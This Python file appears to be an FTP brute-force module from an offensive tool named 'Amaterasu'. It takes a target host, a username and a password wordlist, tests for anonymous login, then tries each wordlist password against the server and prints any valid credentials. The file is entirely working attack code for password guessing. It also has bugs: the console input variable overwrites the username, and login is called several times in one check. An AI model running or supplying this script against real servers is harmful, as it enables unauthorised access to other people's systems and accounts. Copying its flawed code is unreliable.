#coding: utf-8
#!/usr/bin/python3

from ftplib import FTP
from huepy import * 
import ftplib
import sys

def ftp_bruteforce_CONFIG():
	target = ''
	user = ''
	passwords = ''

	while True:
		user = input(bold(red('\nAMATERASU ')) + '(' + bold(lightcyan('ftp_bruteforce')) + ')' + '> ')
		if user.startswith('set'):
			try:
				if user.split(' ')[1] == 'target' or user.split(' ')[1] == 'TARGET':
					target = user.split(' ')[2]
					print(bold(info('Target set: ' + target)))
				elif user.split(' ')[1] == 'user' or user.split(' ')[1] == 'USER':
					user = user.split(' ')[2]
					print(bold(info('User set: ' + user)))
				elif user.split(' ')[1] == 'passwords' or user.split(' ')[1] == 'PASSWORDS':
					passwords = user.split(' ')[2]
					print(bold(info('Password wordlist set: ' + passwords)))
				else:
					print(bold(bad('Error: option do not exist.')))
					print(bold(info('Select what to set.\n')))
					print(bold(info('target\tset target TARGET')))
					print(bold(info('user\tset user USER')))
					print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
			except IndexError:
				print(bold(info('Select what to set.\n')))
				print(bold(info('target\tset target TARGET')))
				print(bold(info('user\tset user USER')))
				print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
		elif user.startswith('show'):
			try:
				if user.split(' ')[1] == 'config':
					print(bold(info('Target:\t\t' + target)))
					print(bold(info('User:\t\t' + user)))
					print(bold(info('Password wordlist:\t\t' + passwords)))
				elif user.split(' ')[1] == 'options':
					print(bold(info('Select what to set.\n')))
					print(bold(info('target\tset target TARGET')))
					print(bold(info('user\tset user USER')))
					print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
				else:
					print(bold(bad('Error: option do not exist.')))
			except IndexError:
				print(bold(info('Select what to show.\n')))
				print(bold(info('Config\t\tshow config')))
				print(bold(info('Options\t\tshow options')))
		elif user.startswith('run'):
			try:
				ftp_bruteforce(target, user, passwords)
			except Exception as e:
				print(bold(bad('Error: {}'.format(e))))
		elif user == 'back':
			break
		elif user == 'exit':
			print(bold(good('Thanks for using Amaterasu.')))
			sys.exit()


def ftp_bruteforce(target, user, passwords):
	ftp = FTP(target)
	answers = {"230 'anonymous@' login ok.", '230 Anonymous access granted, restrictions apply', '230 Login successfull.', 'Guest login ok, access restrictions apply.', 'User anonymous logged in.'}

	try:
		if ftp.login() in answers or ftp.login() == '230' or ftp.login().startswith('230'):
			print(bold(good('Anonymous login is open.')))
			print(bold(good('Username: anonymous')))
			print(bold(good('Password: anonymous@')))
			print()
	except:
		pass
	ftp.close()

	passw = open(passwords, 'r')

	ftp = FTP(target)

	for password in passw:
		try:
			if ftp.login(user, password.strip()):
				print(bold(good('Success.')))
				print(bold(good('Username: ' + user)))
				print(bold(good('Password: ' + password)))
		except ftplib.error_perm:
				print(bold(bad('Failed.')))
				print(bold(bad('Username failed: ' + user)))
				print(bold(bad('Password failed: ' + password)))
		except Exception:
			pass
	ftp.close()
